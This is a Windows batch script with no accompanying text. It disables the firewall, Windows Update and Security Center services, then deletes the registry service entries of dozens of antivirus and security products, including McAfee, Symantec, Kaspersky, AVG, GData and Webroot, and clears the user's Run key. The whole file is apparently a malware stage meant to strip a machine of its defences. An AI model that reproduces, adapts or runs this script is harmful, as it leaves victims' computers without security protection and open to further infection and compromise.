@echo off
netsh firewall set notifications Disable
sc stop SharedAccess
sc config SharedAccess start= disabled
sc stop wuauserv
sc config SharedAccess start= disabled
sc stop wscsvc
sc config wscsvc start= disabled

REG DELETE HKLM\SYSTEM\CURRENTCONTROLSET\SERVICES\WSCSVC /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\RsRavMon /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\RsCCenter /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\kavsvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\kavsvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\wscsvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\KVSrvXP /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\MskService  /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\FireSvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McShield /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McTaskManager /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McAfeeFramework /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SNDSrvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\ccProxy /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\ccEvtMgr /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\ccSetMgr /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SPBBCSvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Symantec Core LC /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\navapsvc  /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\NPFMntor /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McDetect.exe /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McTskshd.exe /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mcupdmgr.exe /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GbpSv /F
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GbpSv
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GdFsHook /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GEARSecurity /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GuardDogEXE /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GdNp /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\GdTdi /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\LiveUpdate /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McAfee HackerWatch Service /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McAfee HackerWatch Service /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mcmispupdmgr /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mcmscsvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McNASvc /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McODS /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mcpromgr /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McRedirector /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\McSysmon /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mfeavfk /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mfebopk /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mfehidk /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mferkdk /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\mfesmfk /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\MpfService /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\NAVENG /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\NAVEX15 /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Norton Ghost /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\NPDriver /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\NProtectService /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SAVRT /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SAVRTPEL /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SAVScan /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SPBBCDrv /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Speed Disk service /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SymantecCoreLC /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SymEvent /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SYMIDSCO /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\SBService /F
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Agendador do LiveUpdate automatico /f
REG DELETE HKLM\SYSTEM\ControlSet001\Enum\Root\LEGACY_GBPSV /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Avg7Core /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Avg7Alrt /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Avg7RsW /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Avg7RsXP /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\Avg7UpdSvc /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\AvgClean /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\AVGEMS /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\AvgTdi /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\aawservice /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\WebrootSpySweeperService /f
